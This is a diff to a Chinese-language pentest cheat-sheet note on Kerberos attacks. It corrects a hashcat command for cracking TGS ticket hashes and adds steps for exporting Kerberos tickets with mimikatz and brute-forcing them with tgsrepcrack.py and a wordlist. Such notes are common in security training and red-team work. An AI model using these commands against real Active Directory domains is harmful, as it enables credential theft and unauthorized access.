@@ -45,7 +45,7 @@ hashcat -m 1000 -a 0 hash.txt rockyou.txt
 * 暴破票据
 
 ```bash
-hashcat -m 13100 -a hash.txt rockyou.txt
+hashcat -m 13100 -a 0 hash.txt rockyou.txt
 ```
 
 ### Kerberoast
@@ -54,5 +54,7 @@ hashcat -m 13100 -a hash.txt rockyou.txt
 
 ```bash
 # 先用mimikatz提取出Kerberos票据（.kirbi文件）
-
+kerberos::list /export
+# 再使用该脚本对导出的kirbi票据文件进行暴破
+python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.txt xxxxxxxxxxxxxxxxx.kirbi
 ```
